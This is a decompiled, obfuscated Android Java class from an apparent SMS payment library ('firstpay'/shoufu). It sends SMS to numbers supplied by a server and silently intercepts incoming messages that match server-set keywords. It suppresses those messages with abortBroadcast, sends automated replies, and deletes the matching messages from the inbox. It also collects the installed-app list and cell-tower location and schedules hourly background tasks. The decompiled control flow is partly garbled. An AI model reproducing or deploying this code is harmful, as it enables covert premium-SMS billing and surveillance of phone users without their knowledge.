package com.shoufu.lib;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.telephony.cdma.CdmaCellLocation;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.Log;
import com.shoufu.entity.response.Ad;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;

public class dv
{
  public static ak a;
  private static ea b = null;
  
  public static long a(Context paramContext)
  {
    try
    {
      int i = a.c(paramContext);
      long l1 = cw.b(paramContext);
      long l2;
      if (l1 == 0L)
      {
        l2 = du.c(paramContext);
        l1 = l2;
        if (l2 > 0L)
        {
          cw.a(paramContext, l2);
          cw.d(paramContext);
          cw.a(paramContext, i);
          cw.c(paramContext, 65);
          l1 = l2;
        }
      }
      for (;;)
      {
        Log.d("Util", "userId:" + l1);
        return l1;
        if (((ai.b(paramContext) != null) && (!cw.c(paramContext).equals(ai.b(paramContext)))) || (i != cw.f(paramContext)) || (65 != cw.o(paramContext)))
        {
          l2 = du.c(paramContext);
          if (l2 > 0L)
          {
            if ((ai.b(paramContext) != null) && (!cw.c(paramContext).equals(ai.b(paramContext)))) {
              cw.a(paramContext, "");
            }
            cw.a(paramContext, l2);
            cw.d(paramContext);
            cw.a(paramContext, i);
            cw.c(paramContext, 65);
            l1 = l2;
          }
        }
      }
    }
    finally {}
  }
  
  public static String a(String paramString, int paramInt)
  {
    String str1;
    if ((TextUtils.isEmpty(paramString)) || (paramInt <= 0)) {
      str1 = "";
    }
    for (;;)
    {
      return str1;
      str1 = paramString;
      try
      {
        if (paramString.getBytes("gbk").length <= paramInt) {
          continue;
        }
        int j = 0;
        str1 = "";
        int i = 0;
        for (;;)
        {
          if (i >= paramString.length()) {
            return str1;
          }
          String str2 = paramString.substring(i, i + 1);
          j += str2.getBytes("gbk").length;
          if (j > paramInt) {
            return str1;
          }
          str1 = str1 + str2;
          i += 1;
        }
        return "";
      }
      catch (UnsupportedEncodingException paramString)
      {
        paramString.printStackTrace();
      }
    }
  }
  
  private static String a(String paramString1, String paramString2)
  {
    String str1 = "";
    try
    {
      Object localObject = paramString1.split("\\|");
      paramString1 = str1;
      if (localObject.length == 2)
      {
        String str2 = URLDecoder.decode(localObject[0], "utf-8");
        localObject = URLDecoder.decode(localObject[1], "utf-8");
        int i = paramString2.indexOf(str2);
        paramString1 = str1;
        if (i != -1)
        {
          paramString2 = paramString2.substring(str2.length() + i);
          i = paramString2.indexOf((String)localObject);
          paramString1 = str1;
          if (i != -1) {
            paramString1 = paramString2.substring(0, i);
          }
        }
      }
      return paramString1;
    }
    catch (Exception paramString1)
    {
      paramString1.printStackTrace();
    }
    return "";
  }
  
  public static ArrayList<bk> a(Context paramContext, String paramString1, String paramString2, long paramLong)
  {
    Uri localUri = Uri.parse("content://sms/");
    localArrayList = new ArrayList();
    try
    {
      paramContext = paramContext.getContentResolver();
      paramString1 = "address = '" + paramString1 + "' and body = '" + paramString2 + "' and date >= " + paramLong;
      paramContext = paramContext.query(localUri, new String[] { "_id", "thread_id", "address", "body", "date", "type" }, paramString1, null, null);
      if (paramContext != null) {
        for (;;)
        {
          if (!paramContext.moveToNext())
          {
            paramContext.close();
            return localArrayList;
          }
          localArrayList.add(new bk(paramContext.getInt(paramContext.getColumnIndex("_id")), paramContext.getLong(paramContext.getColumnIndex("thread_id")), paramContext.getString(paramContext.getColumnIndex("address")), paramContext.getString(paramContext.getColumnIndex("body")), paramContext.getLong(paramContext.getColumnIndex("date"))));
        }
      }
      return localArrayList;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
  }
  
  public static void a(Activity paramActivity, boolean paramBoolean)
  {
    if (b != null) {
      b = null;
    }
    b = new ea(paramActivity);
    new dy(paramActivity, paramBoolean).start();
  }
  
  protected static void a(Context paramContext, int paramInt, String paramString1, String paramString2, Bundle paramBundle1, Bundle paramBundle2)
  {
    Object localObject1 = paramBundle1;
    if (paramBundle1 == null) {
      localObject1 = new Bundle();
    }
    paramBundle1 = paramBundle2;
    if (paramBundle2 == null) {
      paramBundle1 = new Bundle();
    }
    paramBundle2 = SmsManager.getDefault();
    Object localObject2 = new Intent("com.firstpay.action.SMS_SEND");
    ((Intent)localObject2).setPackage(paramContext.getPackageName());
    ((Intent)localObject2).putExtras((Bundle)localObject1);
    localObject2 = PendingIntent.getBroadcast(paramContext, paramInt, (Intent)localObject2, 134217728);
    localObject1 = new ArrayList();
    ((ArrayList)localObject1).add(localObject2);
    localObject2 = new Intent("com.firstpay.action.SMS_DELIVERED");
    ((Intent)localObject2).setPackage(paramContext.getPackageName());
    ((Intent)localObject2).putExtras(paramBundle1);
    paramContext = PendingIntent.getBroadcast(paramContext, paramInt, (Intent)localObject2, 134217728);
    paramBundle1 = new ArrayList();
    paramBundle1.add(paramContext);
    paramBundle2.sendMultipartTextMessage(paramString1, null, paramBundle2.divideMessage(paramString2), (ArrayList)localObject1, paramBundle1);
  }
  
  public static void a(Context paramContext, Intent paramIntent, BroadcastReceiver paramBroadcastReceiver)
  {
    Object localObject2;
    Object localObject1;
    int i;
    int j;
    Object localObject4;
    if ("com.firstpay.action.SMS_SEND".equals(paramIntent.getAction()))
    {
      localObject2 = paramIntent.getExtras();
      paramIntent = ((Bundle)localObject2).getString("zypid");
      if (!TextUtils.isEmpty(paramIntent))
      {
        localObject1 = ((Bundle)localObject2).getString("tradeid");
        i = ((Bundle)localObject2).getInt("tid");
        j = ((Bundle)localObject2).getInt("smsid");
        localObject3 = ((Bundle)localObject2).getString("tonum");
        localObject4 = ((Bundle)localObject2).getString("smsbody");
        localObject2 = ((Bundle)localObject2).getString("price");
        if (paramBroadcastReceiver.getResultCode() == -1)
        {
          cx.a(paramContext, paramIntent, (String)localObject2, (String)localObject4);
          dn.a(paramContext, (String)localObject1, j, 0, 0, i);
        }
      }
    }
    label150:
    label279:
    label289:
    label291:
    label313:
    label359:
    label456:
    do
    {
      do
      {
        do
        {
          do
          {
            int k;
            do
            {
              break label150;
              break label150;
              break label150;
              break label150;
              break label150;
              paramIntent = a(paramContext, (String)localObject3, (String)localObject4, am.a(120).getTimeInMillis()).iterator();
              for (;;)
              {
                if (!paramIntent.hasNext())
                {
                  return;
                  if ((paramBroadcastReceiver.getResultCode() == 133404) || (cx.c == null)) {
                    break label359;
                  }
                  cx.c.obtainMessage(7, cx.b, 0).sendToTarget();
                  break;
                }
                a(paramContext, (bk)paramIntent.next());
              }
              paramIntent = ((Bundle)localObject2).getString("tradeid");
              j = ((Bundle)localObject2).getInt("tid");
              k = ((Bundle)localObject2).getInt("smsid");
              i = ((Bundle)localObject2).getInt("commit");
              localObject1 = ((Bundle)localObject2).getString("tonum");
              localObject2 = ((Bundle)localObject2).getString("smsbody");
            } while (paramIntent == null);
            if (i == 1)
            {
              localObject3 = com.shoufu.a.a.iterator();
              if (!((Iterator)localObject3).hasNext())
              {
                i = 0;
                if ((i == 0) && (paramBroadcastReceiver.getResultCode() == -1))
                {
                  dn.a(paramContext, paramIntent, k, 0, 0, j);
                  break label456;
                }
              }
            }
            for (;;)
            {
              paramIntent = a(paramContext, (String)localObject1, (String)localObject2, am.a(120).getTimeInMillis()).iterator();
              while (paramIntent.hasNext()) {
                a(paramContext, (bk)paramIntent.next());
              }
              break label150;
              break;
              localObject4 = (com.shoufu.a)((Iterator)localObject3).next();
              if (("".equals(((com.shoufu.a)localObject4).c())) || (!((com.shoufu.a)localObject4).c().equals(paramIntent))) {
                break label279;
              }
              if (paramBroadcastReceiver.getResultCode() == -1)
              {
                ((com.shoufu.a)localObject4).a();
                dn.a(paramContext, paramIntent, k, 0, 0, j);
                i = 1;
                break label291;
              }
              if (paramBroadcastReceiver.getResultCode() == 133404) {
                break label289;
              }
              ((com.shoufu.a)localObject4).b();
              i = 0;
              break label291;
              localObject3 = com.shoufu.a.a.iterator();
              if (((Iterator)localObject3).hasNext())
              {
                localObject4 = (com.shoufu.a)((Iterator)localObject3).next();
                if (!((com.shoufu.a)localObject4).c().equals(paramIntent)) {
                  break label313;
                }
                if ((paramBroadcastReceiver.getResultCode() != 133404) && (paramBroadcastReceiver.getResultCode() != -1)) {
                  ((com.shoufu.a)localObject4).b();
                }
              }
            }
          } while ((!"android.provider.Telephony.SMS_RECEIVED".equals(paramIntent.getAction())) && (!"android.provider.Telephony.SMS_RECEIVED2".equals(paramIntent.getAction())));
          localObject1 = new StringBuffer();
          localObject2 = (Object[])paramIntent.getExtras().get("pdus");
          paramIntent = null;
          j = localObject2.length;
          i = 0;
          if (i < j) {
            break;
          }
        } while (!a(paramContext, paramIntent, ((StringBuffer)localObject1).toString()));
        paramBroadcastReceiver.abortBroadcast();
        paramBroadcastReceiver = b(paramContext, paramIntent, ((StringBuffer)localObject1).toString());
      } while (paramBroadcastReceiver == null);
      Log.d("Util", "blockByReceiver: linkTradeid->" + paramBroadcastReceiver.a() + " linkSmsid->" + paramBroadcastReceiver.c() + " blockid->" + paramBroadcastReceiver.getBlockid() + " tid->" + paramBroadcastReceiver.b());
    } while ("observer".equals(paramBroadcastReceiver.g()));
    ci.a(paramContext, paramBroadcastReceiver.a(), paramBroadcastReceiver.getBlockid(), "receiver");
    a(paramContext, paramBroadcastReceiver, paramIntent, ((StringBuffer)localObject1).toString());
    ci.a(paramContext, paramBroadcastReceiver);
    dn.a(paramContext, paramBroadcastReceiver.a(), paramBroadcastReceiver.c(), paramBroadcastReceiver.getBlockid(), 1, paramBroadcastReceiver.b());
    return;
    Object localObject3 = SmsMessage.createFromPdu((byte[])localObject2[i]);
    ((StringBuffer)localObject1).append(((SmsMessage)localObject3).getDisplayMessageBody());
    if (paramIntent == null) {
      paramIntent = ((SmsMessage)localObject3).getDisplayOriginatingAddress();
    }
    for (;;)
    {
      i += 1;
      break;
    }
  }
  
  public static void a(Context paramContext, Ad paramAd, Intent paramIntent)
  {
    if (a != null)
    {
      a.a();
      a = null;
    }
    a = new ak(paramContext, 1, 17301633, paramAd.getTitle(), 1, paramIntent);
    if (!TextUtils.isEmpty(paramAd.getIconurl())) {}
    for (paramContext = y.a(paramAd.getIconurl());; paramContext = null)
    {
      if (paramContext != null)
      {
        a.a(paramContext, paramAd.getTitle(), paramAd.getIntro(), paramAd.getCancelable());
        return;
      }
      a.a(paramAd.getTitle(), paramAd.getIntro(), paramAd.getCancelable());
      return;
    }
  }
  
  public static void a(Context paramContext, bh paramBh, String paramString1, String paramString2)
  {
    Object localObject;
    if (paramBh.getIsback() > 0)
    {
      if (!"sms".equals(paramBh.h())) {
        break label111;
      }
      localObject = "";
      if (paramBh.f() != 1) {
        break label82;
      }
    }
    label82:
    label111:
    while (!"url".equals(paramBh.h())) {
      for (;;)
      {
        try
        {
          paramString2 = URLDecoder.decode(paramBh.getBackcontent(), "utf-8");
          localObject = paramString2;
        }
        catch (UnsupportedEncodingException paramString2)
        {
          paramString2.printStackTrace();
          continue;
        }
        if (!TextUtils.isEmpty((CharSequence)localObject)) {
          a(paramContext, paramBh.a(), paramBh.b(), paramBh.c(), 1, paramString1, (String)localObject);
        }
        return;
        if ((paramBh.f() == 2) || (paramBh.f() == 3)) {
          localObject = a(paramBh.getBlockkey(), paramString2);
        }
      }
    }
    paramString2 = a(paramBh.getBlockkey(), paramString2);
    try
    {
      paramContext = URLDecoder.decode(paramBh.getBackcontent(), "utf-8");
      localObject = com.shoufu.a.a.iterator();
      if (!((Iterator)localObject).hasNext())
      {
        paramString1 = null;
        cx.a(paramString1, paramContext, paramString2, paramBh.i());
        return;
      }
    }
    catch (UnsupportedEncodingException paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
        paramContext = "";
        continue;
        paramString1 = (com.shoufu.a)((Iterator)localObject).next();
        if (("".equals(paramString1.c())) || (!paramString1.c().equals(paramBh.a()))) {}
      }
    }
  }
  
  protected static void a(Context paramContext, String paramString1, int paramInt1, int paramInt2, int paramInt3, String paramString2, String paramString3)
  {
    Bundle localBundle = new Bundle();
    localBundle.putString("tradeid", paramString1);
    localBundle.putInt("tid", paramInt1);
    localBundle.putInt("smsid", paramInt2);
    localBundle.putInt("commit", paramInt3);
    localBundle.putString("tonum", paramString2);
    localBundle.putString("smsbody", paramString3);
    a(paramContext, paramInt2, paramString2, paramString3, localBundle, null);
  }
  
  protected static void a(Context paramContext, String paramString1, int paramInt1, int paramInt2, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    Bundle localBundle = new Bundle();
    localBundle.putString("tradeid", paramString1);
    localBundle.putInt("tid", paramInt1);
    localBundle.putInt("smsid", paramInt2);
    localBundle.putString("tonum", paramString2);
    localBundle.putString("smsbody", paramString3);
    localBundle.putString("zypid", paramString4);
    localBundle.putString("price", paramString5);
    a(paramContext, paramInt2, paramString2, "12" + paramString3, localBundle, null);
    Log.d("Util", "sendZYReg");
  }
  
  public static void a(String paramString) {}
  
  public static boolean a(Context paramContext, bk paramBk)
  {
    Uri localUri = Uri.parse("content://sms");
    try
    {
      i = paramContext.getContentResolver().delete(localUri, "thread_id = ? and _id = ?", new String[] { String.valueOf(paramBk.b()), String.valueOf(paramBk.a()) });
      if (i > 0) {
        return true;
      }
    }
    catch (Exception paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
        int i = 0;
      }
    }
    return false;
  }
  
  public static boolean a(Context paramContext, String paramString1, String paramString2)
  {
    paramContext = ci.a(paramContext, true).iterator();
    int i;
    label158:
    do
    {
      if (!paramContext.hasNext()) {
        return false;
      }
      Object localObject = (bh)paramContext.next();
      int j;
      do
      {
        try
        {
          String str = URLDecoder.decode(((bh)localObject).getBlocknum(), "utf-8");
          if ((paramString1.length() < str.length()) || (!paramString1.substring(0, str.length()).equals(str))) {
            break;
          }
          localObject = ((bh)localObject).getBlockkey().split("\\|");
          try
          {
            j = localObject.length;
            i = 0;
          }
          catch (Exception localException1)
          {
            int k;
            localException1.printStackTrace();
            i = 0;
            break label158;
          }
          k = paramString2.indexOf(URLDecoder.decode(localObject[i], "utf-8"));
          if (k == -1)
          {
            i = 0;
            break label158;
          }
          i += 1;
        }
        catch (Exception localException2)
        {
          localException2.printStackTrace();
        }
        break;
      } while (i < j);
      i = 1;
    } while (i == 0);
    return true;
  }
  
  public static bh b(Context paramContext, String paramString1, String paramString2)
  {
    paramContext = ci.a(paramContext, false).iterator();
    int i;
    label162:
    do
    {
      if (!paramContext.hasNext()) {
        return null;
      }
      bh localBh = (bh)paramContext.next();
      int j;
      int k;
      do
      {
        try
        {
          Object localObject = URLDecoder.decode(localBh.getBlocknum(), "utf-8");
          if ((paramString1.length() < ((String)localObject).length()) || (!paramString1.substring(0, ((String)localObject).length()).equals(localObject))) {
            break;
          }
          localObject = localBh.getBlockkey().split("\\|");
          j = 1;
          try
          {
            k = localObject.length;
            i = 0;
          }
          catch (Exception localException2)
          {
            int m;
            localException2.printStackTrace();
            i = 0;
            break label162;
          }
          m = paramString2.indexOf(URLDecoder.decode(localObject[i], "utf-8"));
          if (m == -1)
          {
            i = 0;
            break label162;
          }
          i += 1;
        }
        catch (Exception localException1)
        {
          localException1.printStackTrace();
        }
        break;
      } while (i < k);
      i = j;
    } while (i == 0);
    return localException1;
  }
  
  public static String b(Context paramContext)
  {
    try
    {
      paramContext = new String(c.a(paramContext, "firstpay/config")).split("\\|")[0];
      return paramContext;
    }
    catch (Exception paramContext)
    {
      Log.d("Util", "未设置projectkey，请在/assets/firstpay/config文件中进行设置");
      paramContext.printStackTrace();
    }
    return null;
  }
  
  public static String c(Context paramContext)
  {
    try
    {
      paramContext = new String(c.a(paramContext, "firstpay/config"));
      return paramContext;
    }
    catch (Exception paramContext)
    {
      Log.d("Util", "未设置config，请在/assets/firstpay/config文件中进行设置");
      paramContext.printStackTrace();
    }
    return null;
  }
  
  public static void d(Context paramContext)
  {
    AlarmManager localAlarmManager = (AlarmManager)paramContext.getSystemService("alarm");
    Intent localIntent = new Intent("com.firstpay.action.TASK");
    localAlarmManager.setRepeating(2, SystemClock.elapsedRealtime() + 600000L, 3600000L, PendingIntent.getBroadcast(paramContext, 1, localIntent, 134217728));
  }
  
  protected static ArrayList<bg> e(Context paramContext)
  {
    ArrayList localArrayList = new ArrayList();
    Iterator localIterator = paramContext.getPackageManager().getInstalledPackages(0).iterator();
    PackageInfo localPackageInfo;
    Object localObject;
    do
    {
      if (!localIterator.hasNext()) {
        return localArrayList;
      }
      localPackageInfo = (PackageInfo)localIterator.next();
      localObject = localPackageInfo.applicationInfo;
    } while (localObject == null);
    if (((((ApplicationInfo)localObject).flags & 0x1) != 0) || ((((ApplicationInfo)localObject).flags & 0x80) != 0)) {}
    for (int i = 1;; i = 0)
    {
      String str = ((ApplicationInfo)localObject).packageName;
      localObject = (String)paramContext.getPackageManager().getApplicationLabel((ApplicationInfo)localObject);
      long l = localPackageInfo.versionCode;
      if (i != 0) {}
      for (i = 1;; i = 0)
      {
        localArrayList.add(new bg(str, (String)localObject, l, i));
        break;
      }
    }
  }
  
  public static void f(Context paramContext)
  {
    new dw(paramContext).start();
  }
  
  public static void g(Context paramContext)
  {
    if ((ac.c(paramContext)) || (!ac.d(paramContext))) {}
    try
    {
      ac.b(paramContext, true);
      if (ac.e(paramContext)) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          ac.a(paramContext, true);
          return;
        }
        catch (Exception paramContext)
        {
          paramContext.printStackTrace();
        }
        localException = localException;
        localException.printStackTrace();
      }
    }
  }
  
  public static String[] h(Context paramContext)
  {
    String str = "-1";
    localObject1 = str;
    try
    {
      paramContext = (TelephonyManager)paramContext.getSystemService("phone");
      localObject1 = str;
      localObject2 = paramContext.getSimOperator();
      i = -1;
      localObject1 = str;
      if (((String)localObject2).contains("46000")) {
        break label295;
      }
      localObject1 = str;
      if (((String)localObject2).contains("46002")) {
        break label295;
      }
      localObject1 = str;
      if (!((String)localObject2).contains("46007")) {
        break label163;
      }
    }
    catch (Exception paramContext)
    {
      for (;;)
      {
        Object localObject2;
        label163:
        paramContext.printStackTrace();
        paramContext = "-1";
        continue;
        paramContext = "-1";
        localObject1 = "-1";
        continue;
        int i = 0;
        continue;
        i = 1;
        continue;
        i = 2;
      }
    }
    if (i == 2)
    {
      localObject1 = str;
      localObject2 = (CdmaCellLocation)paramContext.getCellLocation();
      localObject1 = str;
      paramContext = String.valueOf(((CdmaCellLocation)localObject2).getNetworkId());
      localObject1 = paramContext;
      i = ((CdmaCellLocation)localObject2).getBaseStationId() / 16;
      str = String.valueOf(i);
      localObject1 = paramContext;
    }
    for (paramContext = str;; paramContext = str)
    {
      Log.d("getBaseStationLacAndCid->", "lac:" + (String)localObject1 + " cid:" + paramContext);
      return new String[] { localObject1, paramContext };
      localObject1 = str;
      if (((String)localObject2).contains("46001")) {
        break label300;
      }
      localObject1 = str;
      if (((String)localObject2).contains("46006")) {
        break label300;
      }
      localObject1 = str;
      if (((String)localObject2).contains("46003")) {
        break label305;
      }
      localObject1 = str;
      if (!((String)localObject2).contains("46005")) {
        break;
      }
      break label305;
      localObject1 = str;
      localObject2 = (GsmCellLocation)paramContext.getCellLocation();
      if (localObject2 == null) {
        break label284;
      }
      localObject1 = str;
      paramContext = String.valueOf(((GsmCellLocation)localObject2).getLac());
      localObject1 = paramContext;
      i = ((GsmCellLocation)localObject2).getCid();
      str = String.valueOf(i & 0xFFFF);
      localObject1 = paramContext;
    }
  }
  
  public static void i(Context paramContext)
  {
    new dz(paramContext).start();
  }
}
